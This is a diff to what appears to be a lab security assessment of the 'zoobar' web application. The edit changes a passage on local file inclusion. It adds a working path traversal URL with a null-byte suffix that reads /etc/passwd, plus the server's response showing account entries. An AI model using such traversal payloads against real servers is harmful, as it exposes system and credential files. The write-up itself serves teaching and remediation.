@@ -261,7 +261,7 @@ It is recommended to use whitelisting approach for approved URLs and not to use 
     
 --------
     
-There is also a local file inclusion vulnerability, which allows us to read files from the zoobar web directory. This vulnerability allows us to go through the source code of the python scripts from the server. The vulnerability does not allow us to read files outside of the zoobar directory. Using a technique, known as path traversal where we would walk down the directory path using ../../ characters is prevented.
+There is also a local file inclusion vulnerability, which allows us to read files from the zoobar web directory. This vulnerability allows us to go through the source code of the python scripts from the server or other sensitive files, such as passwd. This vulnerability presents a clear security risk since it exposes sensitive configuration files and source code to users.
 
 The web server should have some sort of Access Control List (ACL) in place that checks and validates if users have access or permissions to run specific files in the environment.
 
@@ -271,7 +271,13 @@ The web server should have some sort of Access Control List (ACL) in place that 
         http_err(fd, 404, "File does not exist: %s", pn);
     }
 
-    http://192.168.239.153:8080/zoobar/auth.py
-    
-    zookfs-exstack: [2157] Request failed: File does not exist: /home/httpd/lab/etc/passwd
-    
+    http://192.168.239.153:8080/zoobar/../../../../../../../../../../../../../../../../etc/passwd%00index.cgi/
+
+    HTTP/1.0 200 OK
+    Content-Type: text/html
+
+    root:x:0:0:root:/root:/bin/bash
+    ...snip...
+    sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+    colord:x:104:110:colord colour management daemon,,,:/var/lib/colord:/bin/false
+    httpd:x:1000:1000:Ubuntu,,,:/home/httpd:/bin/bash
